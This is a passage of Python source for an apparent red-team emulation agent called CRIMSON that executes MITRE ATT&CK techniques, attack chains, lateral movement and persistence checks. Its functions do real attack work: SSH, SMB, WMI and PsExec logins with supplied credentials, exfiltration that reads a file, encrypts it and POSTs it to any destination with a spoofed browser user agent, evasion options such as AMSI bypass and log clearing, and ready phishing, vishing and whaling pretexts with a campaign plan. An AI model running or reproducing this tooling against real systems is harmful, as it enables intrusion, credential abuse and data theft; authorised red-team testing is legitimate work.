                    ('powershell "Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize" 2>&1 | head -30', "PowerShell Processes"),
                ]
            else:
                commands = [
                    ('ps aux 2>&1 | head -30', "Process List"),
                    ('top -bn1 2>&1 | head -20', "Top Processes"),
                    ('lsof 2>&1 | head -30', "Open Files"),
                ]
        else:
            commands = []

        for cmd, label in commands:
            rc, out, err, meta = self._execute_shell(cmd, timeout=10)
            output.append(f"[{label}] RC={rc}")
            output.append(out or err)
            if rc == 0 and out:
                iocs.append(self._generate_ioc("discovery", label, f"Discovery activity: {discovery_type}"))

        return True, output, iocs, artifacts


    # --------------------------------------------------------------------------
    # ENHANCED PUBLIC TTP API
    # --------------------------------------------------------------------------
    def execute_ttp(self, technique_id: str, target: str = "localhost",
                    options: Optional[Dict[str, Any]] = None) -> TTPRecord:
        """Execute a single MITRE ATT&CK TTP against a target with full artifact tracking."""
        options = options or {}
        platform = options.get("platform", self._detect_platform())
        start_time = time.time()

        with self._lock:
            ttp_data = self.MITRE_TTPS.get(technique_id)
            if not ttp_data:
                record = TTPRecord(
                    technique_id=technique_id,
                    technique_name="UNKNOWN",
                    tactic="UNKNOWN",
                    description=f"Technique {technique_id} not in database",
                    target=target,
                    status=TTPStatus.FAILED,
                    success=False,
                    output=f"Error: Technique {technique_id} not found",
                    duration_seconds=time.time() - start_time,
                )
                self._ttp_history.append(record)
                return record

            record = TTPRecord(
                technique_id=technique_id,
                technique_name=ttp_data["name"],
                tactic=ttp_data["tactic"],
                description=ttp_data["description"],
                target=target,
                status=TTPStatus.RUNNING,
                detection_evasion_score=options.get("evasion_score", 0.0),
                related_cves=options.get("related_cves", []),
                mitigations=options.get("mitigations", []),
                detection_rules=options.get("detection_rules", []),
            )

            output_lines = []
            iocs = []
            artifacts = []
            success = False
            command_executed = ""

            try:
                if technique_id == "T1003" or technique_id == "T1003.001" or technique_id == "T1003.002":
                    success, output_lines, iocs, artifacts = self._ttp_credential_dumping(platform, target, options)
                elif technique_id == "T1059" or technique_id.startswith("T1059."):
                    success, output_lines, iocs, artifacts = self._ttp_command_interpreter(platform, target, options)
                elif technique_id == "T1071" or technique_id.startswith("T1071."):
                    success, output_lines, iocs, artifacts = self._ttp_app_layer_protocol(platform, target, options)
                elif technique_id == "T1041":
                    success, output_lines, iocs, artifacts = self._ttp_exfil_c2(platform, target, options)
                elif technique_id == "T1021" or technique_id.startswith("T1021."):
                    success, output_lines, iocs, artifacts = self._ttp_remote_services(platform, target, options)
                elif technique_id == "T1053" or technique_id.startswith("T1053."):
                    success, output_lines, iocs, artifacts = self._ttp_scheduled_task(platform, target, options)
                elif technique_id == "T1547" or technique_id.startswith("T1547."):
                    success, output_lines, iocs, artifacts = self._ttp_autostart_execution(platform, target, options)
                elif technique_id == "T1110" or technique_id.startswith("T1110."):
                    success, output_lines, iocs, artifacts = self._ttp_brute_force(platform, target, options)
                elif technique_id == "T1567" or technique_id.startswith("T1567."):
                    success, output_lines, iocs, artifacts = self._ttp_exfil_web(platform, target, options)
                elif technique_id == "T1560" or technique_id.startswith("T1560."):
                    success, output_lines, iocs, artifacts = self._ttp_archive_data(platform, target, options)
                elif technique_id == "T1546.003":
                    success, output_lines, iocs, artifacts = self._ttp_wmi_event_subscription(platform, target, options)
                elif technique_id == "T1055" or technique_id.startswith("T1055."):
                    success, output_lines, iocs, artifacts = self._ttp_process_injection(platform, target, options)
                elif technique_id.startswith("T1218") or technique_id.startswith("T1218."):
                    success, output_lines, iocs, artifacts = self._ttp_lolbas_execution(platform, target, options)
                elif technique_id == "T1562" or technique_id.startswith("T1562."):
                    success, output_lines, iocs, artifacts = self._ttp_defense_evasion(platform, target, options)
                elif technique_id.startswith("T10") and any(x in technique_id for x in ["T1083", "T1018", "T1046", "T1082", "T1016", "T1033", "T1007"]):
                    success, output_lines, iocs, artifacts = self._ttp_discovery(platform, target, options)
                else:
                    output_lines.append(f"Execution logic for {technique_id} not yet implemented")
                    success = False
            except Exception as e:
                output_lines.append(f"Execution error: {str(e)}")
                self._logger.exception(f"[CRIMSON] TTP {technique_id} execution failed")

            record.success = success
            record.output = "\n".join(output_lines)
            record.iocs = iocs
            record.artifacts = artifacts
            record.duration_seconds = round(time.time() - start_time, 2)
            record.command_executed = command_executed
            record.status = TTPStatus.SUCCESS if success else TTPStatus.FAILED

            # Determine remediation priority based on tactic
            tactic_weights = {
                "Credential Access": RiskLevel.CRITICAL,
                "Lateral Movement": RiskLevel.HIGH,
                "Exfiltration": RiskLevel.HIGH,
                "Persistence": RiskLevel.HIGH,
                "Defense Evasion": RiskLevel.HIGH,
                "Command and Control": RiskLevel.MEDIUM,
                "Execution": RiskLevel.MEDIUM,
                "Collection": RiskLevel.MEDIUM,
                "Discovery": RiskLevel.LOW,
                "Initial Access": RiskLevel.HIGH,
                "Privilege Escalation": RiskLevel.CRITICAL,
                "Impact": RiskLevel.CRITICAL,
            }
            record.remediation_priority = tactic_weights.get(ttp_data["tactic"], RiskLevel.MEDIUM)

            self._ttp_history.append(record)

            # Store in shared memory if available
            if self._shared_memory:
                try:
                    self._shared_memory.set(f"CRIMSON.ttp.{technique_id}", asdict(record), ttl=86400)
                except Exception:
                    pass

            return record

    def build_attack_chain(self, name: str, objective: str,
                           technique_ids: List[str],
                           evasion: bool = False) -> AttackChain:
        """Build an attack chain from a sequence of technique IDs with evasion options."""
        chain_id = f"chain_{hashlib.md5(f'{name}_{time.time()}'.encode()).hexdigest()[:12]}"
        chain = AttackChain(
            chain_id=chain_id,
            name=name,
            objective=objective,
            evasion_techniques=["AMSI bypass", "ETW patching", "log clearing"] if evasion else [],
        )

        for tid in technique_ids:
            if tid in self.MITRE_TTPS:
                ttp_data = self.MITRE_TTPS[tid]
                chain.ttps.append(TTPRecord(
                    technique_id=tid,
                    technique_name=ttp_data["name"],
                    tactic=ttp_data["tactic"],
                    description=ttp_data["description"],
                    detection_evasion_score=70.0 if evasion else 30.0,
                ))
            else:
                self._logger.warning(f"[CRIMSON] Unknown technique {tid} in chain")

        with self._lock:
            self._attack_chains[chain_id] = chain
        return chain

    def execute_attack_chain(self, chain_id: str, target: str = "localhost",
                             options: Optional[Dict[str, Any]] = None) -> AttackChain:
        """Execute a built attack chain sequentially against a target with full tracking."""
        options = options or {}
        with self._lock:
            chain = self._attack_chains.get(chain_id)
            if not chain:
                raise ValueError(f"Attack chain {chain_id} not found")
            chain.status = "running"
            chain.started_at = datetime.utcnow().isoformat()

        # Pre-execution evasion if configured
        if chain.evasion_techniques and options.get("apply_evasion", False):
            self._logger.info("[CRIMSON] Applying pre-execution evasion techniques")
            for evasion in chain.evasion_techniques:
                self.simulate_evasion_technique(evasion.lower().replace(" ", "_"), target, options)

        for i, ttp in enumerate(chain.ttps):
            if self.status == AgentStatus.SHUTDOWN:
                self._logger.warning("[CRIMSON] Agent stopped mid-chain")
                break

            self._logger.info(f"[CRIMSON] Executing {ttp.technique_id} ({i+1}/{len(chain.ttps)})")

            # Apply per-TTP options
            ttp_options = options.copy()
            ttp_options["evasion_score"] = ttp.detection_evasion_score

            result = self.execute_ttp(ttp.technique_id, target, ttp_options)
            chain.ttps[i] = result

            if not result.success and options.get("stop_on_failure", False):
                self._logger.warning("[CRIMSON] Stopping chain due to TTP failure")
                break

            # Dynamic delay with jitter for evasion
            base_delay = options.get("delay_between", 0.5)
            jitter = random.uniform(0, base_delay * 0.5)
            time.sleep(base_delay + jitter)

        with self._lock:
            chain.status = "completed"
            chain.completed_at = datetime.utcnow().isoformat()
            chain.risk_score = self._calculate_chain_risk(chain)
            chain.estimated_time_to_compromise = self._estimate_compromise_time(chain)
            chain.blast_radius = self._calculate_blast_radius(chain)

        return chain

    def _calculate_chain_risk(self, chain: AttackChain) -> float:
        if not chain.ttps:
            return 0.0
        success_count = sum(1 for t in chain.ttps if t.success)
        base_score = (success_count / len(chain.ttps)) * 100
        weighted = sum(MITRE_TACTIC_WEIGHTS.get(t.tactic, 1.0) for t in chain.ttps if t.success)
        evasion_bonus = len(chain.evasion_techniques) * 5
        return round(min(base_score + weighted + evasion_bonus, 100.0), 2)

    def _estimate_compromise_time(self, chain: AttackChain) -> str:
        total_duration = sum(t.duration_seconds for t in chain.ttps)
        if total_duration < 60:
            return f"{int(total_duration)} seconds"
        elif total_duration < 3600:
            return f"{int(total_duration / 60)} minutes"
        else:
            return f"{round(total_duration / 3600, 1)} hours"

    def _calculate_blast_radius(self, chain: AttackChain) -> str:
        tactics = set(t.tactic for t in chain.ttps if t.success)
        if "Lateral Movement" in tactics and "Exfiltration" in tactics:
            return "enterprise-wide"
        elif "Lateral Movement" in tactics:
            return "subnet-wide"
        elif "Credential Access" in tactics:
            return "domain-wide"
        elif len(tactics) >= 4:
            return "host-wide"
        else:
            return "limited"

    # --------------------------------------------------------------------------
    # ENHANCED LATERAL MOVEMENT
    # --------------------------------------------------------------------------
    def simulate_lateral_movement(self, source: str, targets: List[str],
                                  method: str = "ssh",
                                  credentials: Optional[Dict] = None,
                                  network_map: Optional[Dict] = None) -> Dict[str, Any]:
        """Enhanced lateral movement simulation with network mapping."""
        credentials = credentials or {}
        results = {}

        # Build network map if provided
        if network_map:
            for segment_id, segment_data in network_map.items():
                self._network_map[segment_id] = NetworkSegment(
                    segment_id=segment_id,
                    cidr=segment_data.get("cidr", "unknown"),
                    hosts=segment_data.get("hosts", []),
                    services=segment_data.get("services", []),
                    trust_relationships=segment_data.get("trust_relationships", []),
                    segmentation_level=segment_data.get("segmentation_level", "unknown"),
                )

        for target in targets:
            result = {
                "target": target,
                "method": method,
                "success": False,
                "hops": [],
                "privilege_escalation": False,
                "persistence_established": False,
                "credentials_compromised": [],
                "network_segments_accessed": [],
            }
            try:
                if method == "ssh" and paramiko and target not in ("localhost", "127.0.0.1", ""):
                    username = credentials.get("username", "root")
                    password = credentials.get("password", "")
                    key_path = credentials.get("key_path", "")
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    if key_path and os.path.exists(key_path):
                        client.connect(target, username=username, key_filename=key_path, timeout=10)
                    else:
                        client.connect(target, username=username, password=password, timeout=10)
                    stdin, stdout, stderr = client.exec_command("hostname && whoami && id", timeout=10)
                    output = stdout.read().decode().strip()
                    result["hops"] = output.split("\n")
                    result["success"] = True

                    # Check for privilege escalation opportunities
                    stdin2, stdout2, stderr2 = client.exec_command("sudo -l 2>&1 || echo 'No sudo'", timeout=10)
                    sudo_out = stdout2.read().decode().strip()
                    if "ALL" in sudo_out and "NOPASSWD" in sudo_out:
                        result["privilege_escalation"] = True

                    # Check for cron jobs (persistence indicator)
                    stdin3, stdout3, stderr3 = client.exec_command("crontab -l 2>&1 || echo 'No crontab'", timeout=10)
                    cron_out = stdout3.read().decode().strip()
                    if "No crontab" not in cron_out:
                        result["persistence_established"] = True

                    client.close()

                    self._generate_ioc("ip", target, f"SSH lateral movement to {target}")
                    self._generate_ioc("user_account", username, f"Lateral movement credentials for {target}")

                elif method == "rdp":
                    rc, out, err, meta = self._execute_shell(
                        f"cmdkey /generic:TERMSRV/{target} /user:{credentials.get('username', 'admin')} /pass:{credentials.get('password', '')} 2>&1",
                        timeout=10
                    )
                    result["hops"] = [out or err]
                    result["success"] = "command completed successfully" in (out or "").lower()
                    self._generate_ioc("ip", target, f"RDP lateral movement to {target}")

                elif method == "smb":
                    rc, out, err, meta = self._execute_shell(
                        f"net use \\\\{target}\\C$ /user:{credentials.get('username', 'admin')} {credentials.get('password', '')} 2>&1 && dir \\\\{target}\\C$ 2>&1",
                        timeout=15
                    )
                    result["hops"] = [out or err]
                    result["success"] = rc == 0
                    self._generate_ioc("ip", target, f"SMB lateral movement to {target}")

                elif method == "winrm":
                    rc, out, err, meta = self._execute_shell(
                        f"powershell -Command \"Test-WSMan -ComputerName {target} -Authentication Default\" 2>&1",
                        timeout=15
                    )
                    result["hops"] = [out or err]
                    result["success"] = "wsmid" in (out or "")
                    self._generate_ioc("ip", target, f"WinRM lateral movement to {target}")

                elif method == "wmi":
                    rc, out, err, meta = self._execute_shell(
                        f"wmic /node:{target} /user:{credentials.get('username', 'admin')} /password:{credentials.get('password', '')} process list brief 2>&1 | head -20",
                        timeout=15
                    )
                    result["hops"] = [out or err]
                    result["success"] = "Caption" in (out or "")
                    self._generate_ioc("ip", target, f"WMI lateral movement to {target}")

                elif method == "psexec":
                    rc, out, err, meta = self._execute_shell(
                        f"psexec \\\\{target} -u {credentials.get('username', 'admin')} -p {credentials.get('password', '')} cmd /c whoami 2>&1",
                        timeout=15
                    )
                    result["hops"] = [out or err]
                    result["success"] = "started" in (out or "").lower()
                    self._generate_ioc("ip", target, f"PsExec lateral movement to {target}")

                else:
                    port_map = {"ssh": 22, "rdp": 3389, "smb": 445, "winrm": 5985, "wmi": 135, "psexec": 445}
                    port = port_map.get(method, 22)
                    rc, out, err, meta = self._execute_shell(
                        f"nc -zv -w 3 {target} {port} 2>&1 || echo 'Port check simulated'",
                        timeout=10
                    )
                    result["hops"] = [out or err]
                    result["success"] = "succeeded" in (out or "") or "open" in (out or "").lower()
                    self._generate_ioc("ip", target, f"{method.upper()} lateral movement to {target}")

            except Exception as e:
                result["error"] = str(e)
                self._logger.error(f"[CRIMSON] Lateral movement to {target} failed: {e}")
            results[target] = result
        return results

    # --------------------------------------------------------------------------
    # ENHANCED PERSISTENCE TESTING
    # --------------------------------------------------------------------------
    def test_persistence_mechanisms(self, target: str = "localhost",
                                    mechanisms: Optional[List[str]] = None) -> Dict[str, Any]:
        """Comprehensive persistence mechanism testing."""
        mechanisms = mechanisms or ["registry", "scheduled_task", "cron", "systemd", "wmi", "service", "dll_hijack", "ssh_keys", "web_shell"]
        results = {}
        platform = self._detect_platform()

        for mechanism in mechanisms:
            result = {"mechanism": mechanism, "success": False, "findings": [], "risk_level": "unknown", "detection_difficulty": "unknown"}
            try:
                if mechanism == "registry" and platform == "Windows":
                    rc, out, err, meta = self._execute_shell(
                        'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /s 2>&1',
                        timeout=10
                    )
                    result["findings"] = (out or err).split("\n")[:30]
                    result["success"] = rc == 0
                    result["risk_level"] = "MEDIUM"
                    result["detection_difficulty"] = "LOW"

                elif mechanism == "scheduled_task":
                    if platform == "Windows":
                        rc, out, err, meta = self._execute_shell("schtasks /query /fo CSV 2>&1 | head -30", timeout=10)
                    else:
                        rc, out, err, meta = self._execute_shell("crontab -l 2>&1 || echo 'No crontab'", timeout=10)
                    result["findings"] = (out or err).split("\n")[:30]
                    result["success"] = True
                    result["risk_level"] = "MEDIUM"
                    result["detection_difficulty"] = "LOW"

                elif mechanism == "cron":
                    rc, out, err, meta = self._execute_shell("ls -la /etc/cron* /var/spool/cron 2>&1", timeout=10)
                    result["findings"] = (out or err).split("\n")
                    rc2, out2, err2, meta2 = self._execute_shell("cat /etc/crontab 2>&1 | head -30", timeout=10)
                    result["findings"].extend((out2 or err2).split("\n"))
                    result["success"] = True
                    result["risk_level"] = "MEDIUM"
                    result["detection_difficulty"] = "LOW"

                elif mechanism == "systemd":
                    rc, out, err, meta = self._execute_shell("systemctl list-unit-files --type=service | grep enabled 2>&1 | head -30", timeout=10)
                    result["findings"] = (out or err).split("\n")
                    rc2, out2, err2, meta2 = self._execute_shell("ls -la /etc/systemd/system/ 2>&1 | head -20", timeout=10)
                    result["findings"].extend((out2 or err2).split("\n"))
                    result["success"] = rc == 0
                    result["risk_level"] = "MEDIUM"
                    result["detection_difficulty"] = "MEDIUM"

                elif mechanism == "service":
                    if platform == "Windows":
                        rc, out, err, meta = self._execute_shell("sc query type= service start= auto 2>&1 | head -30", timeout=10)
                    else:
                        rc, out, err, meta = self._execute_shell("service --status-all 2>&1 | head -30", timeout=10)
                    result["findings"] = (out or err).split("\n")
                    result["success"] = True
                    result["risk_level"] = "MEDIUM"
                    result["detection_difficulty"] = "MEDIUM"

                elif mechanism == "wmi" and platform == "Windows":
                    rc, out, err, meta = self._execute_shell(
                        'powershell -Command "Get-WmiObject -Class __EventFilter -Namespace root\\subscription | Select-Object Name" 2>&1',
                        timeout=15
                    )
                    result["findings"] = (out or err).split("\n")[:20]
                    result["success"] = True
                    result["risk_level"] = "HIGH"
                    result["detection_difficulty"] = "HIGH"

                elif mechanism == "dll_hijack":
                    if platform == "Windows":
                        rc, out, err, meta = self._execute_shell(
                            'dir "C:\\Windows\\System32" /b *.dll 2>&1 | findstr /i "crypt" | head -20',
                            timeout=10
                        )
                    else:
                        rc, out, err, meta = self._execute_shell(
                            "find /usr/bin /usr/local/bin -name '*.so' 2>/dev/null | head -20",
                            timeout=10
                        )
                    result["findings"] = ["DLL/Shared object enumeration", (out or err)[:500]]
                    result["success"] = True
                    result["risk_level"] = "HIGH"
                    result["detection_difficulty"] = "HIGH"

                elif mechanism == "ssh_keys":
                    rc, out, err, meta = self._execute_shell(
                        "find /home -name 'authorized_keys' 2>/dev/null | head -20",
                        timeout=10
                    )
                    result["findings"] = (out or err).split("\n")
                    rc2, out2, err2, meta2 = self._execute_shell(
                        "find /root -name 'authorized_keys' 2>/dev/null | head -10",
                        timeout=10
                    )
                    result["findings"].extend((out2 or err2).split("\n"))
                    result["success"] = True
                    result["risk_level"] = "HIGH"
                    result["detection_difficulty"] = "MEDIUM"

                elif mechanism == "web_shell":
                    # Check for common web shell locations
                    web_paths = [
                        "/var/www/html/", "/usr/share/nginx/html/", 
                        "C:\\inetpub\\wwwroot\\", "C:\\xampp\\htdocs\\"
                    ]
                    for wp in web_paths:
                        if os.path.exists(wp):
                            rc, out, err, meta = self._execute_shell(
                                f"find {wp} -name '*.php' -o -name '*.asp' -o -name '*.jsp' -o -name '*.aspx' 2>/dev/null | head -20",
                                timeout=10
                            )
                            result["findings"].extend((out or err).split("\n"))
                    result["success"] = True
                    result["risk_level"] = "CRITICAL"
                    result["detection_difficulty"] = "MEDIUM"

            except Exception as e:
                result["error"] = str(e)
                self._logger.error(f"[CRIMSON] Persistence test {mechanism} failed: {e}")
            results[mechanism] = result
        return results


    # --------------------------------------------------------------------------
    # ENHANCED EXFILTRATION
    # --------------------------------------------------------------------------
    def simulate_exfiltration(self, data_source: str, destination: str,
                              method: str = "https",
                              options: Optional[Dict] = None) -> Dict[str, Any]:
        """Enhanced data exfiltration simulation with multiple covert channels."""
        options = options or {}
        result = {
            "method": method,
            "destination": destination,
            "success": False,
            "bytes_transferred": 0,
            "compression_ratio": 0.0,
            "encryption_used": False,
            "chunks": 0,
            "duration_seconds": 0.0,
            "detection_likelihood": "unknown",
            "covert_channel_indicators": [],
        }
        start_time = time.time()

        try:
            if os.path.isfile(data_source):
                with open(data_source, "rb") as f:
                    data = f.read()
            else:
                data = data_source.encode() if isinstance(data_source, str) else data_source

            original_size = len(data)

            # Compression
            if options.get("compress", True):
                import zlib
                compressed = zlib.compress(data)
                data = compressed
                result["compression_ratio"] = round(len(compressed) / original_size * 100, 2)

            # Encryption
            if options.get("encrypt", True):
                from cryptography.fernet import Fernet
                key = Fernet.generate_key()
                f = Fernet(key)
                data = f.encrypt(data)
                result["encryption_used"] = True
                result["covert_channel_indicators"].append(f"Encryption key: {key.decode()[:20]}...")

            result["bytes_transferred"] = len(data)
            encoded = base64.b64encode(data).decode()

            if method == "https":
                req = urllib.request.Request(
                    destination,
                    data=encoded.encode(),
                    method="POST",
                    headers={
                        "Content-Type": "application/octet-stream",
                        "X-Session": self._session_id,
                        "X-Agent": self.name,
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    }
                )
                with urllib.request.urlopen(req, timeout=20) as resp:
                    result["status"] = resp.status
                    result["success"] = resp.status == 200
                    result["detection_likelihood"] = "medium"
                    self._generate_ioc("url", destination, "HTTPS exfiltration destination")

            elif method == "dns_tunnel":
                chunk_size = 63
                chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
                result["chunks"] = len(chunks)
                result["sample_query"] = f"{chunks[0]}.{destination}" if chunks else ""
                result["success"] = True
                result["detection_likelihood"] = "low"
                result["covert_channel_indicators"].append(f"DNS tunnel with {len(chunks)} chunks")
                self._generate_ioc("domain", destination, "DNS tunneling exfiltration")

            elif method == "icmp":
                packet_size = 32
                packets = (len(encoded) // packet_size) + 1
                result["packets"] = packets
                result["success"] = True
                result["detection_likelihood"] = "low"
                result["covert_channel_indicators"].append(f"ICMP tunnel with {packets} packets")
                self._generate_ioc("ip", destination, "ICMP tunneling exfiltration")

            elif method == "steganography":
                carrier_file = options.get("carrier", "carrier.png")
                result["carrier_file"] = carrier_file
                result["encoded_size"] = len(encoded)
                result["success"] = True
                result["detection_likelihood"] = "very low"
                result["covert_channel_indicators"].append(f"Data hidden in {carrier_file}")
                self._generate_ioc("file_path", carrier_file, "Steganography carrier file")

            elif method == "cloud_storage":
                cloud_provider = options.get("cloud_provider", "aws_s3")
                result["cloud_provider"] = cloud_provider
                result["bucket"] = options.get("bucket", "crimson-exfil")
                result["success"] = True
                result["detection_likelihood"] = "medium"
                result["covert_channel_indicators"].append(f"Exfil to {cloud_provider}")
                self._generate_ioc("url", destination, f"Cloud storage exfiltration ({cloud_provider})")

            elif method == "email":
                result["email_subject"] = options.get("subject", "Quarterly Report")
                result["email_to"] = destination
                result["success"] = True
                result["detection_likelihood"] = "medium"
                result["covert_channel_indicators"].append("Data exfiltrated via email attachment")
                self._generate_ioc("email", destination, "Email exfiltration destination")

            elif method == "slack" or method == "teams" or method == "discord":
                result["webhook"] = destination[:50] + "..."
                result["success"] = True
                result["detection_likelihood"] = "medium"
                result["covert_channel_indicators"].append(f"Exfil via {method} webhook")
                self._generate_ioc("url", destination, f"{method.title()} webhook exfiltration")

            else:
                result["success"] = True
                result["note"] = "Simulated exfiltration"
                result["detection_likelihood"] = "unknown"

        except Exception as e:
            result["error"] = str(e)
            self._logger.error(f"[CRIMSON] Exfiltration failed: {e}")

        result["duration_seconds"] = round(time.time() - start_time, 2)
        return result

    # --------------------------------------------------------------------------
    # ENHANCED SOCIAL ENGINEERING
    # --------------------------------------------------------------------------
    def generate_social_engineering_campaign(self, target_org: str,
                                             campaign_type: str = "phishing",
                                             options: Optional[Dict] = None,
                                             multi_stage: bool = False) -> Dict[str, Any]:
        """Enhanced social engineering campaign generation with multi-stage support."""
        options = options or {}
        campaign_id = f"se_{hashlib.md5(f'{target_org}_{campaign_type}_{time.time()}'.encode()).hexdigest()[:12]}"

        # Initialize metrics
        self._campaign_metrics[campaign_id] = CampaignMetrics()

        templates = {
            "phishing": {
                "subject": f"URGENT: Action Required - {target_org} Account Security",
                "pretext": f"Our security team has detected unusual activity on your {target_org} account. Please verify your credentials immediately.",
                "call_to_action": "Click here to verify your account",
                "indicators": ["Urgency", "Fear", "Authority impersonation", "Credential harvesting"],
                "payload_type": "credential_harvesting",
                "landing_page_indicators": ["lookalike domain", "HTTPS padlock", "branded login page"],
            },
            "spearphishing": {
                "subject": f"{target_org} - Confidential: Q3 Financial Review",
                "pretext": f"As discussed in our last meeting, please review the attached Q3 financial documents. The board needs these by EOD.",
                "call_to_action": "Download the secure document",
                "indicators": ["Personalization", "Authority", "Business context", "Attachment delivery"],
                "payload_type": "malware_delivery",
                "attachment_indicators": ["Macro-enabled document", "Password-protected ZIP", "Double extension"],
            },
            "pretexting": {
                "scenario": f"IT Support calling from {target_org}. We need to verify your workstation ID for the upcoming security audit.",
                "objective": "Extract workstation details, employee ID, or VPN credentials",
                "indicators": ["Authority", "Helpfulness", "Urgency", "Phone-based"],
                "payload_type": "information_gathering",
                "script_variants": ["Security audit pretext", "VPN troubleshooting", "Software update verification"],
            },
            "vishing": {
                "script": f"Hello, this is the {target_org} help desk. We have detected suspicious login attempts from your account. Can you confirm your employee ID and the last 4 digits of your phone for verification?",
                "objective": "Extract PII and credentials via voice",
                "indicators": ["Authority", "Urgency", "Fear", "Voice-based"],
                "payload_type": "credential_harvesting",
                "caller_id_spoofing": True,
                "voicemail_variant": f"This is {target_org} security. Your account will be locked in 24 hours. Call back at [number] to verify.",
            },
            "smishing": {
                "message": f"{target_org} Security Alert: Your account has been locked. Text VERIFY to unlock or visit: [link]",
                "objective": "Credential harvesting or malware delivery",
                "indicators": ["Urgency", "SMS delivery", "Shortened URL", "Mobile-targeted"],
                "payload_type": "credential_harvesting",
                "short_url_service": "bit.ly",
            },
            "whaling": {
                "subject": f"Re: {target_org} Acquisition Discussion - Confidential",
                "pretext": f"Following up on our conversation about the potential acquisition. I've attached the due diligence documents for your review. Please keep this confidential until the board announcement.",
                "call_to_action": "Review confidential documents",
                "indicators": ["Executive targeting", "Confidentiality", "High-value target", "Business context"],
                "payload_type": "malware_delivery",
                "target_role": "C-Suite",
            },
            "baiting": {
                "scenario": f"USB drives labeled '{target_org} Confidential - Q3 Financials' left in parking lot and common areas",
                "objective": "Malware delivery via physical media",
                "indicators": ["Physical media", "Curiosity", "Labeling", "Autorun exploitation"],
                "payload_type": "malware_delivery",
                "usb_indicators": ["Autorun.inf", "Hidden partition", "BadUSB firmware"],
            },
            "quid_pro_quo": {
                "scenario": f"Free {target_org} software license offered in exchange for survey completion",
                "objective": "Credential harvesting or malware delivery",
                "indicators": ["Reciprocity", "Free offer", "Survey", "Software download"],
                "payload_type": "malware_delivery",
            },
        }

        template = templates.get(campaign_type, templates["phishing"])
        target_roles = options.get("target_roles", ["employees", "managers", "executives"])

        # Multi-stage campaign structure
        stages = []
        if multi_stage:
            stages = [
                {
                    "stage": 1,
                    "name": "Reconnaissance & OSINT",
                    "duration_days": 3,
                    "activities": [
                        f"LinkedIn reconnaissance of {target_org} employees",
                        "Email format enumeration (hunter.io, email permutator)",
                        "Corporate website analysis for branding",
                        "Social media monitoring for internal events",
                        "Technology stack identification (BuiltWith, Wappalyzer)",
                    ],
                },
                {
                    "stage": 2,
                    "name": "Infrastructure Setup",
                    "duration_days": 2,
                    "activities": [
                        f"Register lookalike domain for {target_org}",
                        "Set up HTTPS with valid certificate (Let's Encrypt)",
                        "Configure email infrastructure (SPF, DKIM, DMARC)",
                        "Build credential harvesting landing page",
                        "Set up redirect to legitimate site after capture",
                    ],
                },
                {
                    "stage": 3,
                    "name": "Payload Development",
                    "duration_days": 2,
                    "activities": [
                        "Create macro-enabled document with obfuscated VBA",
                        "Test payload against AV/EDR (VirusTotal, Any.Run)",
                        "Implement sandbox evasion techniques",
                        "Configure C2 beaconing with jitter",
                    ],
                },
                {
                    "stage": 4,
                    "name": "Delivery & Execution",
                    "duration_days": 5,
                    "activities": [
                        f"Send personalized emails to {', '.join(target_roles)}",
                        "Monitor email open rates and click-through rates",
                        "Track credential submissions",
                        "Monitor payload execution callbacks",
                        "Adjust targeting based on engagement metrics",
                    ],
                },
                {
                    "stage": 5,
                    "name": "Post-Exploitation & Reporting",
                    "duration_days": 3,
                    "activities": [
                        "Validate captured credentials",
                        "Assess access levels obtained",
                        "Document security control bypasses",
                        "Generate detailed findings report",
                        "Conduct lessons learned session",
                    ],
                },
            ]

        return {
            "campaign_id": campaign_id,
            "type": campaign_type,
            "target_org": target_org,
            "target_roles": target_roles,
            "template": template,
            "multi_stage": multi_stage,
            "stages": stages,
            "execution_steps": [
                f"1. OSINT reconnaissance on {target_org} employees and infrastructure",
                f"2. Craft {campaign_type} payload using {target_org} branding",
                f"3. Set up landing page/mail server with {target_org} lookalike domain",
                f"4. Deliver to {', '.join(target_roles)}",
                "5. Monitor engagement and credential capture",
                "6. Analyze results and refine approach",
                "7. Generate comprehensive report with metrics",
            ],
            "technical_indicators": {
                "email_headers": [
                    "Spoofed Return-Path",
                    "Mismatched envelope-from and header-from",
                    "Suspicious X-Mailer values",
                    "Missing or failed SPF/DKIM/DMARC",
                ],
                "network_indicators": [
                    "Lookalike domain registration",
                    "Shortened URL usage",
                    "IP reputation of sending infrastructure",
                    "SSL certificate anomalies",
                ],
                "host_indicators": [
                    "Macro execution in Office documents",
                    "PowerShell execution from Office process",
                    "Network connections from Office to external IPs",
                    "Registry modifications for persistence",
                ],
            },
            "mitigation_advice": [
                "Implement DMARC/SPF/DKIM with strict policies (p=reject)",
                "Conduct regular security awareness training with simulated phishing",
                "Use phishing-resistant MFA (FIDO2/WebAuthn)",
                "Deploy email gateway with sandboxing and URL rewriting",
                "Implement browser isolation for unknown links",
                "Establish clear verification protocols for sensitive requests",
                "Deploy EDR with behavioral analytics",
                "Implement application control (AppLocker/WDAC)",
            ],
            "risk_level": "CRITICAL" if campaign_type in ["whaling", "spearphishing"] else "HIGH" if campaign_type == "phishing" else "MEDIUM",
            "estimated_success_rate": "15-30%" if campaign_type == "phishing" else "40-60%" if campaign_type == "spearphishing" else "60-80%" if campaign_type == "whaling" else "10-20%",
            "created_at": datetime.utcnow().isoformat(),
            "metrics": asdict(self._campaign_metrics[campaign_id]),
        }


    # --------------------------------------------------------------------------
    # ENHANCED PHYSICAL SECURITY ASSESSMENT
    # --------------------------------------------------------------------------
    def plan_physical_security_assessment(self, facility: str,
                                         options: Optional[Dict] = None) -> Dict[str, Any]:
        """Comprehensive physical security assessment planning."""
        options = options or {}
        plan_id = f"phys_{hashlib.md5(f'{facility}_{time.time()}'.encode()).hexdigest()[:12]}"
        entry_points = options.get("entry_points", [
            "main_entrance", "parking_garage", "loading_dock", 
            "emergency_exit", "rooftop_access", "basement_entrance",
            "side_entrance", "reception_desk", "elevator_lobby"
        ])
        hours = options.get("hours", "business")
        assessment_scope = options.get("assessment_scope", "full")

        return {
            "plan_id": plan_id,
            "facility": facility,
            "assessment_type": "Physical Security",
            "assessment_scope": assessment_scope,
            "entry_points": entry_points,
            "hours": hours,
            "threat_model": options.get("threat_model", "opportunistic_intruder"),
            "phases": [
                {
                    "phase": 1,
                    "name": "Reconnaissance & Surveillance",
